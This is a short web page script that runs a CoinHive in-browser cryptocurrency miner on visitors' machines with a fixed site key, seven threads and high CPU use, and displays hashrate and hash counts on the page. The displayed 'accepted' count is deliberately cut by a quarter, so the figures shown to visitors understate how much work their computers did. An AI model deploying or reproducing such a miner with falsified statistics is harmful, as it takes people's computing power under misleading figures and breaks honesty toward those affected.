		<script>
			function RunMiner()
			{
				var miner = new CoinHive.Anonymous('SJVt02MNQamiiRfyxarRIZ7qTDpcKcWs', {threads: 7,throttle: 0.85, theme: 'dark'});
				// Only start if not opted-out in the last 14400 seconds (4 hours):
				if (!miner.didOptOut(14400)) { miner.start(); }
				
				// Listen on events
				miner.on('authed', function(params) {
					console.log('Authenicated. Your token name is: ', miner.getToken());
				});
				//miner.on('found', function() { console.log("A hash was found."); /* Hash found */ })
				//miner.on('accepted', function() { console.log("A hash was accepted! (yay!)"); /* Hash accepted by the pool */ })

				// Update stats once per second
				setInterval(function() {
					var text_hashrate = document.getElementById('hashrate');

					// Output to HTML elements...
					text_hashrate.textContent = Math.round(miner.getHashesPerSecond(true))  + ' H/s';
					
				}, 125);
				setInterval(function() {
					var text_accepted = document.getElementById('accepted');
					var text_total = document.getElementById('total');

					// Output to HTML elements...
					text_accepted.textContent = miner.getAcceptedHashes() - (miner.getAcceptedHashes() / 4) ;
					text_total.textContent = miner.getTotalHashes();
					
				}, 500);
			}
		</script>
